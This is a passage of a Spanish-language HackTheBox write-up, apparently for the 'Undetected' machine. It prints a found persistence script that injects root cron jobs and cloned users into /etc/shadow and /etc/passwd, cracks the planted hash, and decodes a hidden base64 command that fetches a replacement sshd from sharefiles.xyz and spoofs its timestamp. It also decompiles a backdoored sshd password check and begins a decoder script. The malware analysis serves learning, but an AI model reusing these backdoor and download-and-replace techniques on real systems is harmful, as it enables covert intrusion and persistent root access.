<span class="nb">echo</span> <span class="s2">"* 3 * * * root /var/lib/.main"</span> <span class="o">&gt;&gt;</span> /etc/crontab
<span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")}'</span> /etc/passwd
<span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1" "$3" "$6" "$7" &gt; users.txt")}'</span> /etc/passwd
<span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> user group home shell _
<span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user</span><span class="s2">"</span>1<span class="s2">":x:</span><span class="nv">$group</span><span class="s2">:</span><span class="nv">$group</span><span class="s2">:,,,:</span><span class="nv">$home</span><span class="s2">:</span><span class="nv">$shell</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /etc/passwd
<span class="k">done</span> &lt; users.txt
<span class="nb">rm </span>users.txt
</pre></table></code></div></div><p>Leyendo el código vemos que se está creando un usuario en base a uno ya existente, en otras palabras es el mismo usuario. Podemos verificar esto con un <code class="language-plaintext highlighter-rouge">cat /etc/passwd | grep bash</code> en la máquina víctima:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">www-data@production:/var/backups$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
<span class="go">root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
    \_____________________________________________ User based on steven
</span></pre></table></code></div></div><p>En la creación del usuario podemos observar la contraseña de <code class="language-plaintext highlighter-rouge">steven1</code> encriptada. Así que procedemos a desencriptarla, nos logeamos por ssh y pa-dentro:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s2">"steven1:</span><span class="se">\$</span><span class="s2">6</span><span class="se">\$</span><span class="s2">zS7ykHfFMg3aYht4</span><span class="se">\$</span><span class="s2">1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/"</span> <span class="o">&gt;</span> <span class="nb">hash</span>
❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 128/128 SSE2 2x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 3 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
ihatehackers     <span class="o">(</span>steven1<span class="o">)</span>     
1g 0:00:01:09 DONE <span class="o">(</span>2022-04-29 02:30<span class="o">)</span> 0.01436g/s 1279p/s 1279c/s 1279C/s janedoe..halo03
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
❯ sshpass <span class="nt">-p</span> <span class="s2">"ihatehackers"</span> ssh steven1@10.10.11.146
steven@production:~<span class="nv">$ </span>find / <span class="nt">-name</span> user.txt 2&gt; /dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="nt">-rw-r-----</span> 1 root steven 33 Apr 29 04:24 /home/steven/user.txt
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Pueden preguntarse, ¿Por qué estamos como <code class="language-plaintext highlighter-rouge">steven</code> y no <code class="language-plaintext highlighter-rouge">steven1</code>?. La respuesta es que al logearnos el sistema detecta que nuestro <strong>User ID</strong> es <strong>1000</strong>, y al buscar el <strong>UID</strong> encuentra solo al usuario <code class="language-plaintext highlighter-rouge">steven</code>, ya que como el <strong>UID</strong> es único, el sistema tomará como perteneciente del <strong>UID</strong> al primer usuario que se creó</p></div></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Enumerando como <strong>steven</strong> encontramos en <code class="language-plaintext highlighter-rouge">/var/mail</code> (directorio para almacenar los archivos de buzón de correos de los usuarios) un correo por parte del usuario <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">steven@production:/var/mail$</span><span class="w"> </span><span class="nb">cd</span> /var/mail/
<span class="gp">steven@production:/var/mail$</span><span class="w"> </span><span class="nb">cat </span>steven 
<span class="go">From root@production  Sun, 25 Jul 2021 10:31:12 GMT
</span><span class="gp">Return-Path: &lt;root@production&gt;</span><span class="w">
</span><span class="go">Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
</span><span class="gp">        for &lt;steven@production&gt;</span><span class="p">;</span> Sun, 25 Jul 2021 10:31:12 GMT
<span class="go">Received: (from root@localhost)
</span><span class="gp">        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;</span><span class="w">
</span><span class="go">        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
</span><span class="gp">Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;</span><span class="w">
</span><span class="go">To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
</span></pre></table></code></div></div><p>Nos comenta que existen comportamientos extraños con el servidor web <code class="language-plaintext highlighter-rouge">Apache</code>, por ello basandonos en la fecha podemos revisar que archivos se han modificado en ese tiempo. Para realizar esa tarea hize un script en <code class="language-plaintext highlighter-rouge">bash</code> para automatizar una búsqueda de que archivos se modificaron unos meses antes de estos extraños comportamientos:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>


<span class="c"># Find apache files by date's mail</span>

<span class="c"># Filtering directories</span>
<span class="nb">echo</span> <span class="s2">"[+] Creating dictionary of apache directories..."</span>
find / <span class="nt">-name</span> <span class="s2">"apache2"</span> 2&gt; /dev/null <span class="o">&gt;</span> paths

<span class="nb">sleep </span>2

tput civis

<span class="c"># Searching files</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Searching mail..."</span>
<span class="nv">mail_path</span><span class="o">=</span><span class="si">$(</span>find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span> 2&gt; /dev/null<span class="si">)</span>
<span class="nb">echo</span> <span class="nv">$mail_path</span>

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Extracting date mail..."</span>
<span class="nv">email_date</span><span class="o">=</span><span class="si">$(</span><span class="nb">date</span> <span class="nt">-r</span> <span class="nv">$mail_path</span> <span class="s2">"+%Y-%m-%d"</span><span class="si">)</span>
<span class="nb">echo</span> <span class="nv">$email_date</span>

<span class="nb">declare</span> <span class="nt">-i</span> <span class="nb">date</span><span class="o">=</span><span class="k">${</span><span class="nv">email_date</span>:5:2<span class="k">}</span>
<span class="nb">let </span>date-<span class="o">=</span>3
<span class="nv">modify_date</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">email_date</span>:0:4<span class="k">}</span>-<span class="s2">"0</span><span class="nv">$date</span><span class="s2">"</span>-<span class="k">${</span><span class="nv">email_date</span>:8:2<span class="k">}</span><span class="si">)</span>

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Searching for modified files 3 months before the email was sent... (</span><span class="nv">$modify_date</span><span class="s2"> - </span><span class="nv">$email_date</span><span class="s2">)"</span>
<span class="k">while </span><span class="nb">read </span>path<span class="p">;</span> <span class="k">do
        if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="nv">$path</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[+] Searching in path </span><span class="nv">$path</span><span class="s2">:"</span><span class="p">;</span>
                find <span class="nv">$path</span> <span class="nt">-type</span> f <span class="nt">-newermt</span> <span class="nv">$modify_date</span> <span class="o">!</span> <span class="nt">-newermt</span> <span class="nv">$email_date</span> <span class="nt">-not</span> <span class="nt">-empty</span> <span class="nt">-ls</span> 2&gt; /dev/null<span class="p">;</span>
                <span class="nb">sleep </span>2<span class="p">;</span>
        <span class="k">fi
done</span> &lt; paths

<span class="nb">rm </span>paths
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Undetected/fileSearchApache">https://github.com/E1P0TR0/</a></p></div></blockquote><p>Al ejecutarlo encontramos lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">steven@production:/tmp$</span><span class="w"> </span>./fileSearch.sh 
<span class="go">[+] Creating dictionary of apache directories...

[+] Searching mail...
/var/mail/steven

[+] Extracting date mail...
2021-07-25

[+] Searching for modified files 3 months before the email was sent... (2021-04-25 - 2021-07-25)
        [+] Searching in path /usr/share/bug/apache2:
        [+] Searching in path /usr/share/doc/apache2:
        [+] Searching in path /usr/share/apache2:
        [+] Searching in path /usr/lib/apache2:
     2050     36 -rw-r--r--   1 root     root        34800 May 17  2021 /usr/lib/apache2/modules/mod_reader.so
        [+] Searching in path /var/cache/apache2:
        [+] Searching in path /var/lib/php/modules/7.4/apache2:
        [+] Searching in path /var/lib/apache2:
        [+] Searching in path /var/log/apache2:
        [+] Searching in path /etc/php/7.4/apache2:
        [+] Searching in path /etc/ufw/applications.d/apache2:
        [+] Searching in path /etc/apache2:
    51006      4 -rw-r--r--   1 root     root          565 Jul  5  2021 /etc/apache2/mods-available/mpm_prefork.conf
    50834      4 -rw-r--r--   1 root     root           69 May 17  2021 /etc/apache2/mods-available/reader.load
    50831     40 -rw-r--r--   1 root     root        37616 Jul  5  2021 /etc/apache2/mods-available/mod_reader.o
    49589      4 -rw-r--r--   1 root     root          338 Jul  6  2021 /etc/apache2/sites-available/000-main.conf
    50858      8 -rw-r--r--   1 root     root         7224 Jun 17  2021 /etc/apache2/apache2.conf
        [+] Searching in path /run/apache2:
        [+] Searching in path /run/lock/apache2:
</span></pre></table></code></div></div><p>Observamos el archivo <code class="language-plaintext highlighter-rouge">mod_reader.so</code> <em>(conocidas como librerías dinámicas por la extensión .so - Shared Object)</em> con última fecha de modificación en <code class="language-plaintext highlighter-rouge">May 17</code>, además tiene relación con el problema ya que los módulos en <code class="language-plaintext highlighter-rouge">apache</code> sirven para diversas funcionalidades del servidor</p><p>Ahora descargamos el archivo a nuestra máquina y vemos que también es un archivo ejecutable, así que extraemos cadenas imprimibles con <code class="language-plaintext highlighter-rouge">strings</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c">.....
....
......
</span><span class="go">d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
</span><span class="c">.....
....
.
</span></pre></table></code></div></div><p>Viendo el formato nos damos cuenta que esta codificado en <strong>Base64</strong>, entonces lo decodeamos y obtenemos estos comandos:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo </span>d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk <span class="o">&gt;</span> hiddenB64Data.txt
❯ <span class="nb">cat </span>hiddenB64Data.txt | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tr</span> <span class="s1">';'</span> <span class="s1">'\n'</span> | <span class="nb">sed</span> <span class="s1">'s/^ //g'</span>
wget sharefiles.xyz/image.jpeg <span class="nt">-O</span> /usr/sbin/sshd
<span class="nb">touch</span> <span class="nt">-d</span> <span class="sb">`</span><span class="nb">date</span> +%Y-%m-%d <span class="nt">-r</span> /usr/sbin/a2enmod<span class="sb">`</span> /usr/sbin/sshd
</pre></table></code></div></div><p>Observamos que se concatena una imagen al binario <code class="language-plaintext highlighter-rouge">sshd</code> <em>(Servidor del protocolo SSH)</em>, y lo que parece sospechoso es que se altera la fecha por el binario <code class="language-plaintext highlighter-rouge">a2enmod</code> <em>(Comando para activar los módulos de apache)</em></p><p>Ya que vemos relación con <strong>SSH</strong> y que el propietario <code class="language-plaintext highlighter-rouge">root</code> es el único que puede modificar este archivo, podemos descargar dicho archivo a nuestra máquina para analizarlo con mas detalle usando <code class="language-plaintext highlighter-rouge">ghidra</code> <em>(herramienta de ingeniería inversa)</em>:</p><blockquote><p>Filtramos por la palabra <code class="language-plaintext highlighter-rouge">password</code> y encontramos algo insteresante:</p></blockquote><p><img data-src="/assets/img/htb/writeups/undetected/ghidra_sshd.png" alt="GHIDRA/SSHD" class="shadow" data-proofer-ignore></p><p>Encontramos la función <code class="language-plaintext highlighter-rouge">auth_password</code> que contiene una variable <code class="language-plaintext highlighter-rouge">backdoor</code> <em>(método que permite a cualquier persona eludir medidas de seguridad para acceder de manera remota y como usuario de alto nivel, a un sistema informático sin el conocimiento del propietario)</em> que guarda una cadena de carácteres en un arreglo. Veamos a detalle la función:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">auth_password</span><span class="p">(</span><span class="n">ssh</span> <span class="o">*</span><span class="n">ssh</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">Authctxt</span> <span class="o">*</span><span class="n">ctxt</span><span class="p">;</span>
  <span class="n">passwd</span> <span class="o">*</span><span class="n">ppVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar4</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar5</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar6</span><span class="p">;</span>
  <span class="n">byte</span> <span class="n">bVar7</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar8</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">backdoor</span> <span class="p">[</span><span class="mi">31</span><span class="p">];</span> <span class="c1">// backdoor variable declaration</span>
  <span class="n">byte</span> <span class="n">local_39</span> <span class="p">[</span><span class="mi">9</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">local_30</span><span class="p">;</span>
  
  <span class="n">bVar7</span> <span class="o">=</span> <span class="mh">0xd6</span><span class="p">;</span>
  <span class="n">ctxt</span> <span class="o">=</span> <span class="p">(</span><span class="n">Authctxt</span> <span class="o">*</span><span class="p">)</span><span class="n">ssh</span><span class="o">-&gt;</span><span class="n">authctxt</span><span class="p">;</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_28_2_</span> <span class="o">=</span> <span class="mh">0xa9f4</span><span class="p">;</span>		 <span class="c1">// backdoor[28-30]</span>
  <span class="n">ppVar1</span> <span class="o">=</span> <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">pw</span><span class="p">;</span>
  <span class="n">iVar8</span> <span class="o">=</span> <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">valid</span><span class="p">;</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_24_4_</span> <span class="o">=</span> <span class="mh">0xbcf0b5e3</span><span class="p">;</span>		 <span class="c1">// backdoor[24-28]</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_16_8_</span> <span class="o">=</span> <span class="mh">0xb2d6f4a0fda0b3d6</span><span class="p">;</span>	 <span class="c1">// backdoor[16-24]</span>
  <span class="n">backdoor</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x5b</span><span class="p">;</span>			 <span class="c1">// backdoor[30]</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_0_4_</span> <span class="o">=</span> <span class="mh">0xf0e7abd6</span><span class="p">;</span>		 <span class="c1">// backdoor[0-4]</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_4_4_</span> <span class="o">=</span> <span class="mh">0xa4b3a3f3</span><span class="p">;</span>		 <span class="c1">// backdoor[4-8]</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_8_4_</span> <span class="o">=</span> <span class="mh">0xf7bbfdc8</span><span class="p">;</span>		 <span class="c1">// backdoor[8-12]</span>
  <span class="n">backdoor</span><span class="p">.</span><span class="n">_12_4_</span> <span class="o">=</span> <span class="mh">0xfdb3d6e7</span><span class="p">;</span> 	 <span class="c1">// backdoor[12-16]</span>

  <span class="n">pbVar4</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">backdoor</span><span class="p">;</span> <span class="c1">// assign a pointer to backdoor for modification</span>

  <span class="c1">// Application of processes to decrypt the backdoor</span>
  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">pbVar5</span> <span class="o">=</span> <span class="n">pbVar4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> 	         <span class="c1">// Store in pbVar5 the position of the next value</span>
    <span class="o">*</span><span class="n">pbVar4</span> <span class="o">=</span> <span class="n">bVar7</span> <span class="o">^</span> <span class="mh">0x96</span><span class="p">;</span>		 <span class="c1">// Store xor operation value between pVar7 and '0x96' in current position (*pbVar4)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pbVar5</span> <span class="o">==</span> <span class="n">local_39</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>       <span class="c1">// Terminate process</span>
    <span class="n">bVar7</span> <span class="o">=</span> <span class="o">*</span><span class="n">pbVar5</span><span class="p">;</span>			 <span class="c1">// Store value of pbVar5 in pVar7 </span>
    <span class="n">pbVar4</span> <span class="o">=</span> <span class="n">pbVar5</span><span class="p">;</span>			 <span class="c1">// Advance to next position</span>
  <span class="p">}</span>
  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">backdoor</span><span class="p">);</span>     <span class="c1">// Compare password entered with the backdoor</span>
  <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

  <span class="c1">// If strings are differents </span>
  <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sVar6</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sVar6</span> <span class="o">&lt;</span> <span class="mh">0x401</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">ppVar1</span><span class="o">-&gt;</span><span class="n">pw_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">permit_root_login</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">iVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">password</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="o">||</span>
         <span class="p">(</span><span class="n">uVar3</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">permit_empty_passwd</span><span class="p">,</span> <span class="n">options</span><span class="p">.</span><span class="n">permit_empty_passwd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">auth_password</span><span class="o">::</span><span class="n">expire_checked</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">auth_password</span><span class="o">::</span><span class="n">expire_checked</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="n">iVar2</span> <span class="o">=</span> <span class="n">auth_shadow_pwexpired</span><span class="p">(</span><span class="n">ctxt</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">force_pwchange</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">iVar2</span> <span class="o">=</span> <span class="n">sys_auth_passwd</span><span class="p">(</span><span class="n">ssh</span><span class="p">,</span><span class="n">password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ctxt</span><span class="o">-&gt;</span><span class="n">force_pwchange</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">auth_restrict_session</span><span class="p">(</span><span class="n">ssh</span><span class="p">);</span> <span class="c1">// Restrict session</span>
        <span class="p">}</span>
        <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">iVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">// If are the same</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Resumiendo el proceso, existe un <strong>backdoor</strong> creado por el desarrollador que sirve para validar la autenticación de un usuario y con ello efectuar la conexión por <strong>SSH</strong>, como se mencionó anteriormente, sobre un usuario privilegiado como <strong>root</strong></p></div></blockquote><p>Ahora solo queda desencriptar esa cadena de tipo <strong>Little Endian</strong> a <strong>Big Endian</strong> <em>(formato en el que se almacenan los datos en forma de bytes en un ordenador)</em>, luego en formato <strong>Hexadecimal</strong> para luego aplicar la operación <strong>XOR</strong>. Para este proceso y a manera de práctica, hice un script en <code class="language-plaintext highlighter-rouge">python3</code> para automatizar todo el proceso:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">shlex</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># ctrl + c
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] Exiting..."</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># help panel
</span><span class="k">def</span> <span class="nf">help</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[!] Do not forget to install the requirements;   Example: sudo ./requirements.sh</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Use: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;file with backdoor data&gt;;    Example: convertPass.py auth_password.c"</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1"># valid args
</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span> <span class="n">help</span><span class="p">()</span>

<span class="c1"># read file
